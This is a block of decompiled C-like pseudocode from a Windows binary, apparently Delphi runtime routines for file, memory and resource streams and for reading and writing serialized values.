      piVar2 = FUN_0040b978((int *)&DAT_00410a28,'\x01',(int **)PTR_PTR_DAT_00441564);
      FUN_00404208((int)piVar2);
    }
  }
  return;
}



void FUN_0041363c(int *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  
  if (param_3 != 0) {
    iVar1 = (**(code **)(*param_1 + 0x10))(param_1,param_2,param_3);
    if (param_3 != iVar1) {
      piVar2 = FUN_0040b978((int *)&DAT_00410a80,'\x01',(int **)PTR_LAB_0044149c);
      FUN_00404208((int)piVar2);
    }
  }
  return;
}



void FUN_00413674(int *param_1,int *param_2,undefined4 param_3,uint param_4,int param_5)

{
  int iVar1;
  int extraout_EDX;
  uint uVar2;
  undefined4 *in_FS_OFFSET;
  bool bVar3;
  undefined4 uStackY52;
  uint local_18;
  
  if ((param_5 == 0) && (param_4 == 0)) {
    uStackY52 = 0x413699;
    FUN_004133f8(param_2,param_2,param_3,0,0);
    param_4 = (**(code **)*param_2)();
    param_5 = extraout_EDX;
  }
  if (param_5 == 0) {
    if (param_4 < 0xf001) {
LAB_004136cd:
      local_18 = param_4;
      goto LAB_004136d3;
    }
  }
  else if (param_5 < 1) goto LAB_004136cd;
  local_18 = 0xf000;
LAB_004136d3:
  iVar1 = FUN_004026a8(local_18);
  uStackY52 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY52;
  do {
    if ((param_5 == 0) && (param_4 == 0)) {
      *in_FS_OFFSET = uStackY52;
      FUN_004026c8(iVar1);
      return;
    }
    uVar2 = local_18;
    if ((int)local_18 >> 0x1f == param_5) {
      if (param_4 <= local_18) {
LAB_00413705:
        uVar2 = param_4;
      }
    }
    else if (param_5 <= (int)local_18 >> 0x1f) goto LAB_00413705;
    FUN_00413604(param_2,iVar1,uVar2);
    FUN_0041363c(param_1,iVar1,uVar2);
    bVar3 = param_4 < uVar2;
    param_4 = param_4 - uVar2;
    param_5 = (param_5 - ((int)uVar2 >> 0x1f)) - (uint)bVar3;
  } while( true );
}



int * FUN_00413768(int *param_1,char param_2,int param_3)

{
  int extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  param_1[1] = param_3;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_00413804(int *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5)

{
  BOOL BVar1;
  
  (**(code **)(*param_1 + 0x18))(param_1,0,*param_1,param_4,param_5);
  BVar1 = SetEndOfFile((HANDLE)param_1[1]);
  FUN_0040ccc8(BVar1);
  return;
}



int * FUN_0041382c(int *param_1,char param_2,undefined *param_3,ushort param_4)

{
  undefined *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  uVar1 = 0;
  FUN_00413870(param_1,'\0',param_3,0,param_4);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = uVar1;
  }
  return param_1;
}



void FUN_00413870(int *param_1,char param_2,undefined *param_3,undefined4 param_4,ushort param_5)

{
  int iVar1;
  DWORD DVar2;
  HANDLE pvVar3;
  undefined *extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffa8;
  undefined *puStack80;
  undefined *puStack76;
  undefined *puStack72;
  undefined4 in_stack_ffffffbc;
  undefined4 in_stack_ffffffc0;
  undefined4 in_stack_ffffffc4;
  undefined4 in_stack_ffffffc8;
  int local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  undefined local_14;
  int local_10;
  undefined local_c;
  char local_5;
  
  local_24 = 0;
  local_28 = 0;
  local_1c = 0;
  local_20 = 0;
  if (param_2 != '\0') {
    puStack72 = (undefined *)0x413893;
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffbc,in_stack_ffffffc0,
                                  in_stack_ffffffc4,in_stack_ffffffc8);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  puStack76 = &LAB_00413999;
  puStack80 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack80;
  local_5 = param_2;
  if (param_5 == 0xffff) {
    puStack72 = &stack0xfffffffc;
    iVar1 = FUN_0040841c(param_3);
    FUN_00413768(param_1,'\0',iVar1);
    if (param_1[1] < 0) {
      FUN_004088f0(param_3,&local_1c);
      local_18 = local_1c;
      local_14 = 0xb;
      DVar2 = GetLastError();
      FUN_0040b0b4(DVar2,&local_20);
      local_10 = local_20;
      local_c = 0xb;
      in_stack_ffffffa8 = 1;
      iVar1 = FUN_0040b9b4((int)&DAT_0041091c,'\x01',(int **)PTR_PTR_DAT_004415b4,1,&local_18);
      FUN_00404208(iVar1);
    }
  }
  else {
    puStack72 = &stack0xfffffffc;
    pvVar3 = FUN_004083a0(param_3,(uint)param_5);
    FUN_00413768(param_1,'\0',(int)pvVar3);
    if (param_1[1] < 0) {
      FUN_004088f0(param_3,&local_24);
      local_18 = local_24;
      local_14 = 0xb;
      DVar2 = GetLastError();
      FUN_0040b0b4(DVar2,&local_28);
      local_10 = local_28;
      local_c = 0xb;
      in_stack_ffffffa8 = 1;
      iVar1 = FUN_0040b9b4((int)&DAT_00410978,'\x01',(int **)PTR_PTR_DAT_00441368,1,&local_18);
      FUN_00404208(iVar1);
    }
  }
  *in_FS_OFFSET = in_stack_ffffffa8;
  puStack80 = &LAB_004139a0;
  FUN_004047cc(&local_28,4);
  return;
}



void FUN_004139f8(int param_1,undefined4 param_2,undefined4 param_3)

{
  *(undefined4 *)(param_1 + 4) = param_2;
  *(undefined4 *)(param_1 + 8) = param_3;
  return;
}



uint FUN_00413a00(int param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = *(int *)(param_1 + 0xc);
  if (((iVar1 < 0) || ((int)param_3 < 0)) || (uVar2 = *(int *)(param_1 + 8) - iVar1, (int)uVar2 < 1)
     ) {
    uVar2 = 0;
  }
  else {
    if ((int)param_3 < (int)uVar2) {
      uVar2 = param_3;
    }
    FUN_0040285c((undefined4 *)(*(int *)(param_1 + 4) + iVar1),param_2,uVar2);
    *(int *)(param_1 + 0xc) = *(int *)(param_1 + 0xc) + uVar2;
  }
  return uVar2;
}



void FUN_00413a5c(int param_1,int *param_2)

{
  if (*(int *)(param_1 + 8) != 0) {
    FUN_0041363c(param_2,*(undefined4 *)(param_1 + 4),*(int *)(param_1 + 8));
  }
  return;
}



void FUN_00413a74(int param_1,undefined *param_2)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY24;
  undefined *puStackY20;
  
  puStackY20 = (undefined *)0x413a8e;
  piVar1 = FUN_0041382c((int *)&PTR_LAB_00411270,'\x01',param_2,0xffff);
  puStackY20 = &LAB_00413abf;
  uStackY24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY24;
  FUN_00413a5c(param_1,piVar1);
  *in_FS_OFFSET = uStackY24;
  puStackY20 = (undefined *)0x413abe;
  FUN_00403b24(piVar1);
  return;
}



void FUN_00413af8(int *param_1)

{
  FUN_00413b10(param_1,0);
  param_1[2] = 0;
  param_1[3] = 0;
  return;
}



void FUN_00413b10(int *param_1,int param_2)

{
  undefined4 uVar1;
  int local_8;
  
  local_8 = param_2;
  uVar1 = (**(code **)(*param_1 + 0x1c))(param_1,&local_8);
  FUN_004139f8((int)param_1,uVar1,param_1[2]);
  param_1[4] = local_8;
  return;
}



LPCVOID FUN_00413b64(int param_1,SIZE_T *param_2)

{
  int *piVar1;
  LPCVOID pvVar2;
  LPCVOID extraout_ECX;
  
  if ((0 < (int)*param_2) && (*param_2 != *(SIZE_T *)(param_1 + 8))) {
    *param_2 = *param_2 + 0x1fff & 0xffffe000;
  }
  pvVar2 = *(LPCVOID *)(param_1 + 4);
  if (*param_2 != *(SIZE_T *)(param_1 + 0x10)) {
    if (*param_2 == 0) {
      FUN_00406dbc(pvVar2);
      pvVar2 = (LPCVOID)0x0;
    }
    else {
      if (*(SIZE_T *)(param_1 + 0x10) == 0) {
        pvVar2 = (LPCVOID)FUN_00406d90((uint)*(ushort *)PTR_DAT_00441548,*param_2);
      }
      else {
        pvVar2 = (LPCVOID)FUN_00406da0(pvVar2,*param_2,(uint)*(ushort *)PTR_DAT_00441548);
      }
      if (pvVar2 == (LPCVOID)0x0) {
        piVar1 = FUN_0040b978((int *)&DAT_00410860,'\x01',(int **)PTR_PTR_DAT_00441584);
        FUN_00404208((int)piVar1);
        pvVar2 = extraout_ECX;
      }
    }
  }
  return pvVar2;
}



int * FUN_00413c40(int *param_1,char param_2,HMODULE param_3,LPCSTR param_4,undefined *param_5)

{
  LPCSTR pCVar1;
  HMODULE extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe0;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe0,in_stack_ffffffe4,
                                  in_stack_ffffffe8,in_stack_ffffffec);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  pCVar1 = FUN_00404c68(param_5);
  FUN_00413d08((int)param_1,param_3,pCVar1,param_4);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe0;
  }
  return param_1;
}



void FUN_00413c98(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  undefined4 *puVar3;
  undefined *puStack28;
  undefined *puStack24;
  undefined *puStack20;
  byte *local_10;
  undefined4 local_c;
  undefined local_8;
  
  puStack20 = &stack0xfffffffc;
  local_10 = (byte *)0x0;
  puStack24 = &LAB_00413cfb;
  puStack28 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack28;
  local_c = *(undefined4 *)(param_4 + -4);
  local_8 = 6;
  puVar3 = &local_c;
  uVar2 = 0;
  FUN_0040658c((int **)PTR_PTR_DAT_0044147c,(int *)&local_10);
  iVar1 = FUN_0040b8f8((int)&DAT_00410ad8,'\x01',local_10,uVar2,puVar3);
  FUN_00404208(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack28 = &LAB_00413d02;
  FUN_004047a8((int *)&local_10);
  return;
}



void FUN_00413d08(int param_1,HMODULE param_2,LPCSTR param_3,LPCSTR param_4)

{
  HRSRC pHVar1;
  HGLOBAL pvVar2;
  DWORD DVar3;
  LPVOID pvVar4;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_DL;
  undefined extraout_DL_00;
  
  pHVar1 = FindResourceA(param_2,param_3,param_4);
  *(HRSRC *)(param_1 + 0x10) = pHVar1;
  if (pHVar1 == (HRSRC)0x0) {
    FUN_00413c98(0,extraout_DL,extraout_CL,&stack0xfffffffc);
  }
  pvVar2 = LoadResource(param_2,*(HRSRC *)(param_1 + 0x10));
  *(HGLOBAL *)(param_1 + 0x14) = pvVar2;
  if (pvVar2 == (HGLOBAL)0x0) {
    FUN_00413c98(0,extraout_DL_00,extraout_CL_00,&stack0xfffffffc);
  }
  DVar3 = SizeofResource(param_2,*(HRSRC *)(param_1 + 0x10));
  pvVar4 = LockResource(*(HGLOBAL *)(param_1 + 0x14));
  FUN_004139f8(param_1,pvVar4,DVar3);
  return;
}



void FUN_00413dc4(int param_1,char *param_2)

{
  int *piVar1;
  int *piVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  
  if (DAT_0044285c == 0) {
    return;
  }
  puStack28 = (undefined *)0x413dea;
  piVar1 = (int *)FUN_00411d48(DAT_0044285c);
  puStack32 = &LAB_00413e5f;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  iVar4 = piVar1[2] + -1;
  puStack28 = &stack0xfffffffc;
  if (-1 < iVar4) {
    do {
      piVar2 = (int *)FUN_00411aa4(piVar1,iVar4);
      if ((param_1 == 0) || (piVar2[2] == param_1)) {
        if (param_2 != (char *)0x0) {
          uVar3 = FUN_00407ec0(param_2,(char *)piVar2[4]);
          if ((char)uVar3 == '\0') goto LAB_00413e41;
        }
        FUN_004119b4(piVar1,iVar4);
        FUN_00403b24(piVar2);
      }
LAB_00413e41:
      iVar4 = iVar4 + -1;
    } while (iVar4 != -1);
  }
  *in_FS_OFFSET = uStack36;
  puStack28 = (undefined *)0x413e66;
  puStack32 = (undefined *)0x413e5e;
  FUN_00411dac(DAT_0044285c);
  return;
}



void FUN_00413e70(int param_1)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  
  if (DAT_0044285c != 0) {
    puStack24 = (undefined *)0x413e8d;
    piVar1 = (int *)FUN_00411d48(DAT_0044285c);
    puStack28 = &DAT_00413ee7;
    uStack32 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack32;
    iVar3 = piVar1[2] + -1;
    puStack24 = &stack0xfffffffc;
    if (-1 < iVar3) {
      do {
        piVar2 = (int *)FUN_00411aa4(piVar1,iVar3);
        if (piVar2[1] == param_1) {
          FUN_004119b4(piVar1,iVar3);
          FUN_00403b24(piVar2);
        }
        iVar3 = iVar3 + -1;
      } while (iVar3 != -1);
    }
    *in_FS_OFFSET = uStack32;
    puStack24 = (undefined *)0x413eee;
    puStack28 = (undefined *)0x413ee6;
    FUN_00411dac(DAT_0044285c);
    return;
  }
  return;
}



void FUN_00413ef4(int **param_1)

{
  int *piVar1;
  
  piVar1 = FUN_0040b978((int *)&DAT_00410a28,'\x01',param_1);
  FUN_00404208((int)piVar1);
  return;
}



void FUN_00413f0c(void)

{
  FUN_00413ef4((int **)PTR_PTR_DAT_004414e0);
  return;
}



void FUN_00413f18(int param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  
  uVar1 = FUN_004141d4(param_1,param_2,param_3);
  if ((char)param_2 != (char)uVar1) {
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + -1;
    FUN_004142e4(param_1,extraout_EDX,extraout_ECX);
    FUN_00413f0c();
  }
  return;
}



uint FUN_00413f3c(int param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = FUN_004141d4(param_1,param_2,param_3);
  *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + -1;
  return uVar1 & 0xffffff00 | (uint)((char)uVar1 == '\0');
}



void FUN_00413f50(int param_1,undefined4 param_2,uint param_3)

{
  FUN_004141d4(param_1,param_2,param_3);
  *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + -1;
  return;
}



void FUN_00413f60(int param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  while (param_3 != 0) {
    uVar2 = *(uint *)(param_1 + 0x14) - *(uint *)(param_1 + 0x10);
    if (*(uint *)(param_1 + 0x14) < *(uint *)(param_1 + 0x10) || uVar2 == 0) {
      FUN_00413fac(param_1);
      uVar2 = *(uint *)(param_1 + 0x14);
    }
    if (param_3 <= uVar2) {
      uVar2 = param_3;
    }
    param_3 = param_3 - uVar2;
    iVar1 = *(int *)(param_1 + 0x10);
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + uVar2;
    puVar4 = (undefined4 *)(*(int *)(param_1 + 8) + iVar1);
    for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *param_2 = *puVar4;
      puVar4 = puVar4 + 1;
      param_2 = param_2 + 1;
    }
    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)param_2 = *(undefined *)puVar4;
      puVar4 = (undefined4 *)((int)puVar4 + 1);
      param_2 = (undefined4 *)((int)param_2 + 1);
    }
  }
  return;
}



void FUN_00413fac(int param_1)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = (**(code **)(**(int **)(param_1 + 4) + 0xc))
                    (*(int **)(param_1 + 4),*(undefined4 *)(param_1 + 8),
                     *(undefined4 *)(param_1 + 0xc));
  *(int *)(param_1 + 0x14) = iVar1;
  if (iVar1 == 0) {
    piVar2 = FUN_0040b978((int *)&DAT_00410a28,'\x01',(int **)PTR_PTR_DAT_00441564);
    FUN_00404208((int)piVar2);
  }
  *(undefined4 *)(param_1 + 0x10) = 0;
  return;
}



void FUN_00413fe8(int param_1,undefined4 param_2,uint param_3)

{
  FUN_00413f18(param_1,CONCAT31((int3)((uint)param_2 >> 8),1),param_3);
  return;
}



void FUN_00413ff0(int param_1)

{
  uint in_ECX;
  
  FUN_00413f18(param_1,0,in_ECX);
  return;
}



void FUN_00413ff8(int param_1,int *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint local_c;
  
  local_c = param_3;
  FUN_00413f60(param_1,&local_c,1);
  FUN_00404898(param_2,(undefined4 *)0x0,local_c & 0xff);
  puVar1 = (undefined4 *)thunk_FUN_00404c74(param_2);
  FUN_00413f60(param_1,puVar1,local_c & 0xff);
  return;
}



void FUN_00414034(int param_1,LPSTR *param_2)

{
  char cVar1;
  uint uVar2;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  LPCWSTR local_c;
  uint local_8;
  
  puStack24 = &stack0xfffffffc;
  local_c = (LPCWSTR)0x0;
  puStack28 = &LAB_004140e1;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  cVar1 = FUN_00413f50(param_1,param_2,0);
  if ((cVar1 == '\x12') || (cVar1 == '\x14')) {
    FUN_004140f0(param_1,&local_c,extraout_ECX);
    FUN_00404a30(param_2,local_c);
  }
  else {
    local_8 = 0;
    uVar2 = FUN_004141d4(param_1,extraout_EDX,extraout_ECX);
    if ((char)uVar2 == '\x06') {
      FUN_00413f60(param_1,&local_8,1);
    }
    else if ((char)uVar2 == '\f') {
      FUN_00413f60(param_1,&local_8,4);
    }
    else {
      FUN_00413f0c();
    }
    FUN_00404d98((int *)param_2,local_8);
    FUN_00413f60(param_1,(undefined4 *)*param_2,local_8);
  }
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_004140e8;
  puStack28 = (undefined *)0x4140e0;
  FUN_00404e54(&local_c);
  return;
}



void FUN_004140f0(int param_1,BSTR *param_2,uint param_3)

{
  char cVar1;
  uint uVar2;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  LPCSTR local_10;
  undefined4 *local_c;
  UINT local_8;
  
  puStack28 = &stack0xfffffffc;
  local_8 = 0;
  local_c = (undefined4 *)0x0;
  local_10 = (LPCSTR)0x0;
  puStack32 = &LAB_004141c7;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  cVar1 = FUN_00413f50(param_1,param_2,param_3);
  if ((cVar1 == '\x06') || (cVar1 == '\f')) {
    FUN_00414034(param_1,&local_10);
    FUN_00404fa0(param_2,local_10);
  }
  else {
    local_8 = 0;
    uVar2 = FUN_004141d4(param_1,extraout_EDX,extraout_ECX);
    if ((char)uVar2 == '\x12') {
      FUN_00413f60(param_1,&local_8,4);
      FUN_0040509c(param_2,local_8);
      FUN_00413f60(param_1,(undefined4 *)*param_2,local_8 * 2);
    }
    else if ((char)uVar2 == '\x14') {
      FUN_00413f60(param_1,&local_8,4);
      FUN_00404d98((int *)&local_c,local_8);
      FUN_00413f60(param_1,local_c,local_8);
      FUN_00406498((undefined *)local_c,param_2);
    }
    else {
      FUN_00413f0c();
    }
  }
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_004141ce;
  puStack32 = (undefined *)0x4141be;
  FUN_004047a8((int *)&local_10);
  puStack32 = (undefined *)0x4141c6;
  FUN_004047a8((int *)&local_c);
  return;
}



uint FUN_004141d4(int param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  uint local_4;
  
  local_4 = param_3;
  uVar1 = FUN_00413f60(param_1,&local_4,1);
  return uVar1 & 0xffffff00 | local_4 & 0xff;
}



void FUN_004141e8(int param_1,undefined4 param_2,uint param_3)

{
  uint extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  int local_8;
  
  puStack16 = &stack0xfffffffc;
  local_8 = 0;
  puStack20 = &LAB_00414224;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  do {
    FUN_00413ff8(param_1,&local_8,param_3);
    param_3 = extraout_ECX;
  } while (local_8 != 0);
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_0041422b;
  puStack20 = (undefined *)0x414223;
  FUN_004047a8(&local_8);
  return;
}



void FUN_00414230(undefined4 param_1,undefined4 param_2,uint param_3,int param_4)

{
  uint uVar1;
  uint extraout_ECX;
  uint extraout_ECX_00;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  int *piVar2;
  
  piVar2 = (int *)(param_4 + -4);
  while( true ) {
    uVar1 = FUN_00413f3c(*piVar2,param_2,param_3);
    if ((char)uVar1 != '\0') break;
    FUN_004142e4(*piVar2,extraout_EDX_00,extraout_ECX_00);
    param_3 = extraout_ECX;
    param_2 = extraout_EDX;
  }
  FUN_00413ff0(*piVar2);
  return;
}



void FUN_00414258(int param_1,undefined4 param_2,int param_3,int param_4)

{
  int local_8;
  
  local_8 = param_3;
  FUN_00413f60(*(int *)(param_4 + -4),&local_8,4);
  FUN_004144c8(*(int *)(param_4 + -4),local_8 * param_1);
  return;
}



void FUN_00414288(undefined4 param_1,undefined4 param_2,uint param_3,int param_4)

{
  char cVar1;
  uint uVar2;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  uint extraout_ECX_03;
  uint extraout_ECX_04;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar3;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  int *piVar4;
  
  piVar4 = (int *)(param_4 + -4);
  while( true ) {
    uVar2 = FUN_00413f3c(*piVar4,param_2,param_3);
    if ((char)uVar2 != '\0') break;
    cVar1 = FUN_00413f50(*piVar4,extraout_EDX_04,extraout_ECX_04);
    if ((byte)(cVar1 - 2U) < 3) {
      FUN_004142e4(*piVar4,extraout_EDX,extraout_ECX);
    }
    FUN_004144c8(*piVar4,1);
    uVar2 = extraout_ECX_00;
    uVar3 = extraout_EDX_00;
    while( true ) {
      uVar2 = FUN_00413f3c(*piVar4,uVar3,uVar2);
      if ((char)uVar2 != '\0') break;
      FUN_00414480(*piVar4,extraout_EDX_02,extraout_ECX_02);
      uVar2 = extraout_ECX_01;
      uVar3 = extraout_EDX_01;
    }
    FUN_00413ff0(*piVar4);
    param_3 = extraout_ECX_03;
    param_2 = extraout_EDX_03;
  }
  FUN_00413ff0(*piVar4);
  return;
}



void FUN_004142e4(int param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  int local_c;
  int local_8;
  
  puStack16 = &stack0xfffffffc;
  local_c = 0;
  puStack20 = &LAB_00414473;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  local_8 = param_1;
  uVar1 = FUN_004141d4(param_1,0,param_3);
  uVar1 = uVar1 & 0x7f;
  switch(uVar1) {
  case 1:
    FUN_00414230(uVar1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 2:
    FUN_004144c8(local_8,1);
    break;
  case 3:
    FUN_004144c8(local_8,2);
    break;
  case 4:
    FUN_004144c8(local_8,4);
    break;
  case 5:
    FUN_004144c8(local_8,10);
    break;
  case 6:
  case 7:
    FUN_00413ff8(local_8,&local_c,extraout_ECX);
    break;
  case 10:
    FUN_00414258(1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0xb:
    FUN_004141e8(local_8,extraout_EDX,extraout_ECX);
    break;
  case 0xc:
    FUN_00414258(1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0xe:
    FUN_00414288(uVar1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0xf:
    FUN_004144c8(local_8,4);
    break;
  case 0x10:
    FUN_004144c8(local_8,8);
    break;
  case 0x11:
    FUN_004144c8(local_8,8);
    break;
  case 0x12:
    FUN_00414258(2,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
    break;
  case 0x13:
    FUN_004144c8(local_8,8);
    break;
  case 0x14:
    FUN_00414258(1,extraout_EDX,extraout_ECX,(int)&stack0xfffffffc);
  }
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_0041447a;
  puStack20 = (undefined *)0x414472;
  FUN_004047a8(&local_c);
  return;
}



void FUN_00414480(int param_1,undefined4 param_2,uint param_3)

{
  uint extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  int local_8;
  
  puStack16 = &stack0xfffffffc;
  local_8 = 0;
  puStack20 = &LAB_004144bd;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  FUN_00413ff8(param_1,&local_8,param_3);
  FUN_004142e4(param_1,extraout_EDX,extraout_ECX);
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_004144c4;
  puStack20 = (undefined *)0x4144bc;
  FUN_004047a8(&local_8);
  return;
}



void FUN_004144c8(int param_1,uint param_2)

{
  undefined4 auStack264 [64];
  
  if (0 < (int)param_2) {
    do {
      if ((int)param_2 < 0x101) {
        FUN_00413f60(param_1,auStack264,param_2);
        param_2 = 0;
      }
      else {
        FUN_00413f60(param_1,auStack264,0x100);
        param_2 = param_2 - 0x100;
      }
    } while (0 < (int)param_2);
  }
  return;
}



void FUN_00414510(int param_1,undefined4 *param_2,uint param_3)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  while (param_3 != 0) {
    uVar2 = *(uint *)(param_1 + 0xc) - *(uint *)(param_1 + 0x10);
    if (*(uint *)(param_1 + 0xc) < *(uint *)(param_1 + 0x10) || uVar2 == 0) {
      FUN_0041455c(param_1);
      uVar2 = *(uint *)(param_1 + 0xc);
    }
    if (param_3 <= uVar2) {
      uVar2 = param_3;
    }
    param_3 = param_3 - uVar2;
    iVar1 = *(int *)(param_1 + 0x10);
    *(int *)(param_1 + 0x10) = *(int *)(param_1 + 0x10) + uVar2;
    puVar4 = (undefined4 *)(*(int *)(param_1 + 8) + iVar1);
    for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
      *puVar4 = *param_2;
      param_2 = param_2 + 1;
      puVar4 = puVar4 + 1;
    }
    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined *)puVar4 = *(undefined *)param_2;
      param_2 = (undefined4 *)((int)param_2 + 1);
      puVar4 = (undefined4 *)((int)puVar4 + 1);
    }
  }
  return;
}



void FUN_0041455c(int param_1)

{
  FUN_0041363c(*(int **)(param_1 + 4),*(undefined4 *)(param_1 + 8),*(int *)(param_1 + 0x10));
  *(undefined4 *)(param_1 + 0x10) = 0;
  return;
}



void FUN_00414574(int param_1,undefined4 param_2,uint param_3)

{
  FUN_00414670(param_1,1,param_3);
  return;
}



void FUN_0041457c(int param_1,undefined4 param_2,uint param_3)

{
  FUN_00414670(param_1,0,param_3);
  return;
}



void FUN_00414584(int param_1,uint *param_2,uint *param_3)

{
  uint extraout_ECX;
  uint extraout_ECX_00;
  undefined in_ZF;
  uint *local_10;
  
  local_10 = param_3;
  FUN_00404bb4(param_2,param_3);
  if ((bool)in_ZF) {
    local_10 = (uint *)FUN_00404a68((int)param_2);
    if ((int)local_10 < 0x100) {
      FUN_00414670(param_1,6,extraout_ECX_00);
      FUN_00414510(param_1,&local_10,1);
    }
    else {
      FUN_00414670(param_1,0xc,extraout_ECX_00);
      FUN_00414510(param_1,&local_10,4);
    }
    FUN_00414510(param_1,param_2,(uint)local_10);
  }
  else {
    local_10 = (uint *)FUN_00404a68((int)param_3);
    FUN_00414670(param_1,0x14,extraout_ECX);
    FUN_00414510(param_1,&local_10,4);
    FUN_00414510(param_1,param_3,(uint)local_10);
  }
  return;
}



